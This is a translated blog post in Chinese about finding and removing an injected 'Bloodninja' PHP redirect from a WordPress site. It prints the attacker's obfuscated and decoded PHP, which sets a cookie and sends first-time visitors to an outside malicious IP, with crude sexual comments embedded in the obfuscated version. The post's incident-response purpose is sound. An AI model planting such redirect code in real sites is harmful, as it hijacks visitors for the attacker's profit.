<html>
<head>
<title>Cleaning Bloodninja PHP attack from Wordpress website</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">从Wordpress网站清除Bloodninja PHP攻击</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/cleaning-bloodninja-php-attack-from-website-7703513bd133?source=collection_archive---------0-----------------------#2019-05-11">https://infosecwriteups.com/cleaning-bloodninja-php-attack-from-website-7703513bd133?source=collection_archive---------0-----------------------#2019-05-11</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="d45a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">给个背景，我们的网站最近被攻击者攻击赚钱了。好吧，这篇文章对于安全领域的专业人士来说可能非常简单，因为这是我第一次只用逻辑来清理黑客。</p><p id="d01d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好了，攻击是如何工作的，在新计算机的第一次访问中，它会将302服务器端重定向到一个恶意的IP地址(http:// 134.249。116.78/index.php)。但第二次访问时没有出现这种情况，网站正常打开。这显然意味着恶意代码正在跟踪过去的访问。所以我首先想到的是饼干。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/8218857103bf326fc913071dcc2e6887.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*y6F_PwitjNLaRE5zabHTbg.jpeg"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">图片来源:solutionsreview.com</figcaption></figure><p id="2cb1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我将我们公司的网址列入黑名单，禁止在我的浏览器上存储cookies。由于没有cookies，每次访问都被重定向到恶意IP地址。有了明确的操作方式，我启用了公司域的cookie，发现一个名为“htp_uid_utm”的cookie在117小时或4天21小时后过期。这意味着我们的用户在4天21小时后的第一次访问和任何重复访问都为攻击者赚了钱。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi lb"><img src="../Images/ae192f5cb9944ca6c64836d86fa3e0c2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1332/format:webp/1*y2BVCLwQsZWT3Kbh9fcrdw.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">在Firefox浏览器中阻止cookies</figcaption></figure><p id="05df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不管怎样，我现在的目标是cookie 'htp_uid_utm '。所以我从我们的服务器上下载了所有文件，并在linux终端上运行了一个grep</p><p id="abc8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> grep -rnw。-e "htp_uid_utm" | less </strong></p><p id="5f18" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还有惊喜！它没有返回任何结果。这可能意味着攻击者混淆了代码。快速在线搜索发现对混淆代码使用了“base64_decode()”。很自然地引出了我的下一个grep命令。</p><p id="db24" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> grep -rnw。-e "base64_decode(" | less </strong></p><p id="4465" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这揭示了大量运行恶意代码的文件。</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="lc ld l"/></div></figure><p id="f8ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Mobilefish <a class="ae le" href="https://www.mobilefish.com/services/eval_gzinflate_base64/eval_gzinflate_base64.php" rel="noopener ugc nofollow" target="_blank">的一个网站https://www . mobile fish . com/services/eval _ gzinflate _ base64/eval _ gzinflate _ base64 . PHP</a>帮助解读代码:</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="lc ld l"/></div></figure><pre class="km kn ko kp gt lf lg lh li aw lj bi"><span id="1bff" class="lk ll iq lg b gy lm ln l lo lp">if(!empty/*Bloodninja: I lick your earlobe, and undo your watch.*/($_SERVER[“HTTP_USER_AGENT”])):$_šÃÆ±ÄÄ=array(“Chro\155e”,”\x46\151refo\x78",”Trident”,”MSIE”,”W\151ndows”,”\x4cinux”,”Ip\150on\x65",”Android”,”Opera”,”Safari”);foreach($_šÃÆ±ÄÄ as$_ß):if(sTRipos($_SERVER[“HTTP_\x55SER_AGENT”],$_ß)!==/*Sarah19fca: mmmm, okay.*/false/*Bloodninja: I take yo pants off, grunting like a troll.*/):if(!isset($_COOKIE[“\x68tp_uid_ut\x6d”])):sETcOOKIe(“htp_ui\x64_u\164m”,”1",TiME()+07020/*Sarah19fca: Yeah I like it rough.*/*030/*Bloodninja: I smack you thick booty.*/*02);HeadEr(“Location: <a class="ae le" href="http://134.\x3249.116.78/ind\x65x.php" rel="noopener ugc nofollow" target="_blank">http://134.\x3249.116.78/ind\x65x.php</a>");die/*Sarah19fca: Oh yeah, that feels good.*/();endif;endif;endforeach;endif;;/*Bloodninja: Smack, Smack, yeeeaahhh.*/</span></pre><p id="78fc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">于是就出现了COOKIE check<br/><em class="lq">isset($ _ COOKIE[" \ x68tp _ uid _ ut \ x6d "])</em><br/>和恶意重定向<br/><em class="lq">HeadEr(" Location:</em><a class="ae le" href="http://134.\x3249.116.78/ind\x65x.php" rel="noopener ugc nofollow" target="_blank"><em class="lq">http://134。\ x 3249 . 116 . 78/ind \ x65x . PHP</em></a><em class="lq">)；</em></p><p id="14d0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此外，攻击者将这次袭击命名为“血忍者”。</p><p id="e046" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">只是为了确认，在运行解码器后，输出是</p><pre class="km kn ko kp gt lf lg lh li aw lj bi"><span id="1625" class="lk ll iq lg b gy lm ln l lo lp">if(!empty($_SERVER[“HTTP_USER_AGENT”])):$_Ʊ=array(“Chrome”,”Firefox”,”Trident”,”MSIE”,”Windows”,”Linux”,”Iphone”,”Android”,”Opera”,”Safari”);foreach($_Ʊ as$_߅):if(sTRipos($_SERVER[“HTTP_USER_AGENT”],$_߅)!==false):if(!isset($_COOKIE[“htp_uid_utm”])):sETcOOKIe(“htp_uid_utm”,”1",TiME()+07020*030*02);HeadEr(“Location: http:// 134.249. 116.78/index.php”);die();endif;endif;endforeach;endif;;</span></pre><p id="cdd9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有了这个认识，接下来我从grep列出的所有文件中删除了这个恶意代码。这些文件中的一些有“wp_”前缀，但是在https://github.com/WordPress/WordPress托管的WordPress代码中没有。我只是把这些文件的Linux权限从644改成了000，这样如果再次发生攻击，他们就无法创建这些现有的无法访问的文件了。</p><p id="79bc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">就这样，我们的网站像以前一样运行了。</p><p id="0a98" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是给攻击者的，就像在他混乱的代码中的注释一样，“啪，啪，耶啊啊。”</p></div><div class="ab cl lr ls hu lt" role="separator"><span class="lu bw bk lv lw lx"/><span class="lu bw bk lv lw lx"/><span class="lu bw bk lv lw"/></div><div class="ij ik il im in"><p id="635d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="lq">关注</em> <a class="ae le" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="lq"> Infosec报道</em> </a> <em class="lq">获取更多此类精彩报道。</em></p><div class="ly lz gp gr ma mb"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="mc ab fo"><div class="md ab me cl cj mf"><h2 class="bd ir gy z fp mg fr fs mh fu fw ip bi translated">信息安全报道</h2><div class="mi l"><h3 class="bd b gy z fp mg fr fs mh fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="mj l"><p class="bd b dl z fp mg fr fs mh fu fw dk translated">medium.com</p></div></div><div class="mk l"><div class="ml l mm mn mo mk mp kv mb"/></div></div></a></div></div></div>    
</body>
</html>